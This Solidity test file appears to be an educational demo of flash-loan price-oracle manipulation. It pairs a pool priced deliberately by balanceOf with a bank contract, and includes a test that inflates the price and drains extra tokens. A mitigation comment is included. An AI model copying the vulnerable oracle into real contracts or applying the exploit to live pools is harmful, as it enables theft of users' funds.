// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/*

Demo:
Price manipulation: Incorrect price calculation over balanceOf(), getReserves, etc.

Mitigation  
Use a manipulation resistant oracle, chainlink, TWAP, etc.

REF:
https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20221012-atk---flashloan-manipulate-price
https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220807-egd-finance---flashloans--price-manipulation
https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220428-deus-dao---flashloan--price-oracle-manipulation
*/

contract ContractTest is Test {
    USDa USDaContract;
    USDb USDbContract;
    SimplePool SimplePoolContract;
    SimpleBank SimpleBankContract;

    function setUp() public {
        USDaContract = new USDa();
        USDbContract = new USDb();
        SimplePoolContract = new SimplePool(
            address(USDaContract),
            address(USDbContract)
        );
        SimpleBankContract = new SimpleBank(
            address(USDaContract),
            address(SimplePoolContract),
            address(USDbContract)
        );
    }

    function testPrice_Manipulation() public {
        USDbContract.transfer(address(SimpleBankContract), 9000 ether);
        USDaContract.transfer(address(SimplePoolContract), 1000 ether);
        USDbContract.transfer(address(SimplePoolContract), 1000 ether);
        // Get the current price of USDa in terms of USDb (initially 1 USDa : 1 USDb)
        SimplePoolContract.getPrice(); // 1 USDa : 1 USDb

        console.log(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit log_named_decimal_uint(
            "Current USDa convert rate",
            SimplePoolContract.getPrice(),
            18
        );
        console.log("Start price manipulation");
        console.log("Borrow 500 USBa over floashloan");
        // Let's manipulate the price since the getPrice is over the balanceOf.
        // Use flashloan to borrow 500 USDb
        SimplePoolContract.flashLoan(500 ether, address(this), "0x0");
    }

    fallback() external {
        //flashlon callback

        emit log_named_decimal_uint(
            "Price manupulated, USDa convert rate",
            SimplePoolContract.getPrice(),
            18
        ); // 1 USDa : 2 USDb

        USDaContract.approve(address(SimpleBankContract), 100 ether);
        SimpleBankContract.exchange(100 ether);

        // Repay the flashloan by transferring 500 USDb to SimplePoolContract
        USDaContract.transfer(address(SimplePoolContract), 500 ether);

        // Get the balance of USDb owned by us.
        emit log_named_decimal_uint(
            "Use 100 USDa to convert, My USDb balance",
            USDbContract.balanceOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

contract SimplePool {
    IERC20 public USDaToken;
    IERC20 public USDbToken;

    constructor(address _USDa, address _USDb) {
        USDaToken = IERC20(_USDa);
        USDbToken = IERC20(_USDb);
    }

    function getPrice() public view returns (uint256) {
        //Incorrect price calculation over balanceOf
        uint256 USDaAmount = USDaToken.balanceOf(address(this));
        uint256 USDbAmount = USDbToken.balanceOf(address(this));

        // Ensure USDbAmount is not zero to prevent division by zero
        if (USDaAmount == 0) {
            return 0;
        }

        // Calculate the price as the ratio of USDa to USDb
        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
        return USDaPrice;
    }

    function flashLoan(
        uint256 amount,
        address borrower,
        bytes calldata data
    ) public {
        uint256 balanceBefore = USDaToken.balanceOf(address(this));
        require(balanceBefore >= amount, "Not enough liquidity");
        require(
            USDaToken.transfer(borrower, amount),
            "Flashloan transfer failed"
        );
        (bool success, ) = borrower.call(data);
        require(success, "Flashloan callback failed");
        uint256 balanceAfter = USDaToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flashloan not repaid");
    }
}

contract SimpleBank {
    IERC20 public token; //USDA
    SimplePool public pool;
    IERC20 public payoutToken; //USDb

    constructor(address _token, address _pool, address _payoutToken) {
        token = IERC20(_token);
        pool = SimplePool(_pool);
        payoutToken = IERC20(_payoutToken);
    }

    function exchange(uint256 amount) public {
        require(
            token.transferFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        uint256 price = pool.getPrice();
        require(price > 0, "Price cannot be zero");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutToken.transfer(msg.sender, tokensToReceive),
            "Payout transfer failed"
        );
    }
}
